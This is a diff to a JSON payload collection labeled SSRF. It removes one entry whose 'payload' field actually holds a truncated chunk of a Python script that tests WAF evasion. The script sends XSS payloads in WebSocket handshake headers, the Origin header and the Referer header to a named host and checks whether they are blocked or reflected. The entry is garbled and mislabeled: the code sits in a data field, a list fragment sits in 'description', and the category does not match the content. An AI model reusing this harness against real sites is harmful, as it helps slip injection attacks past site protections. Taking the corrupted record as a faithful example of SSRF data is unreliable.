@@ -1,22 +1,8 @@
 {
   "category": "ssrf",
   "subcategory": "general",
-  "count": 7,
+  "count": 6,
   "payloads": [
-    {
-      "id": "ssrf-0001",
-      "category": "ssrf",
-      "subcategory": "general",
-      "payload": "utf-8\", errors=\"replace\")\n        status_m = re.search(r'HTTP/[\\d.]+ (\\d+)', resp_str)\n        status = int(status_m.group(1)) if status_m else 0\n        blocked = status in (403, 406, 503)\n        reflected = check_xss(resp_str) if not blocked else False\n        \n        report(name, status, blocked, reflected, location)\n        if reflected:\n            print(f\"    BODY SNIPPET: {resp_str[resp_str.find('<div>'):resp_str.find('<div>')+200]}\")\n        return status, blocked, reflected\n    except Exception as e:\n        print(f\"  {name:55s} ERR: {str(e)[:60]}\")\n        return 0, True, False\n\n\n# ══════════════════════════════════════════════════════════════════\nprint(\"\n\" + \"=\" * 80)\nprint(\"40A: WebSocket Upgrade — XSS in Various Parts of WS Handshake\")\nprint(\"=\" * 80 + \"\n\")\n\nws_key = base64.b64encode(b\"0123456789abcdef\").decode()\n\n# XSS in query string during WS upgrade\nfor pname, payload in list(PAYLOADS.items())[:10]:\n    enc = urllib.parse.quote(payload)\n    raw_req(f\"ws-query-{pname}\",\n        f\"GET /?globalHtml={enc} HTTP/1.1\r\n\"\n        f\"Host: waf.cumulusfire.net\r\n\"\n        f\"Upgrade: websocket\r\n\"\n        f\"Connection: Upgrade\r\n\"\n        f\"Sec-WebSocket-Key: {ws_key}\r\n\"\n        f\"Sec-WebSocket-Version: 13\r\n\r\n\".encode(),\n        \"ws-query\")\n    time.sleep(0.2)\n\n# XSS in Sec-WebSocket-Protocol header\nfor pname, payload in [(\"xss-svg\", PAYLOADS[\"xss-svg\"]),\n                        (\"gap-svg-lb\", PAYLOADS[\"gap-svg-lb\"]),\n                        (\"real-onfocus\", PAYLOADS[\"real-onfocus\"])]:\n    raw_req(f\"ws-proto-{pname}\",\n        f\"GET / HTTP/1.1\r\n\"\n        f\"Host: waf.cumulusfire.net\r\n\"\n        f\"Upgrade: websocket\r\n\"\n        f\"Connection: Upgrade\r\n\"\n        f\"Sec-WebSocket-Key: {ws_key}\r\n\"\n        f\"Sec-WebSocket-Version: 13\r\n\"\n        f\"Sec-WebSocket-Protocol: {payload}\r\n\r\n\".encode(),\n        \"ws-proto\")\n    time.sleep(0.2)\n\n# XSS in Origin header during WS upgrade\nfor pname, payload in [(\"xss-svg\", PAYLOADS[\"xss-svg\"]),\n                        (\"gap-svg-lb\", PAYLOADS[\"gap-svg-lb\"])]:\n    raw_req(f\"ws-origin-{pname}\",\n        f\"GET / HTTP/1.1\r\n\"\n        f\"Host: waf.cumulusfire.net\r\n\"\n        f\"Upgrade: websocket\r\n\"\n        f\"Connection: Upgrade\r\n\"\n        f\"Sec-WebSocket-Key: {ws_key}\r\n\"\n        f\"Sec-WebSocket-Version: 13\r\n\"\n        f\"Origin: {payload}\r\n\r\n\".encode(),\n        \"ws-origin\")\n    time.sleep(0.2)\n\n# ══════════════════════════════════════════════════════════════════\nprint(\"\n\" + \"=\" * 80)\nprint(\"40B: Referer Header — XSS Payloads\")\nprint(\"=\" * 80 + \"\n\")\n\nfor pname, payload in PAYLOADS.items():\n    enc = urllib.parse.quote(payload)\n    # Referer with XSS in query param\n    raw_req(f\"ref-q-{pname}\",\n        f\"GET / HTTP/1.1\r\n\"\n        f\"Host: waf.cumulusfire.net\r\n\"\n        f\"Referer: https://waf.cumulusfire.net/?globalHtml={enc}\r\n\"\n        f\"Connection: close\r\n\r\n\".encode(),\n        \"referer\")\n    time.sleep(0.15)\n\n# Referer with raw (non-URL-encoded) XSS\nfor pname in [\"gap-backtick-load",
-      "description": "gap-brace-load\", \"xss-svg\", \"real-onload",
-      "technique": "direct_injection",
-      "source_file": "waf_round40_ws_headers.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
     {
       "id": "ssrf-0002",
       "category": "ssrf",
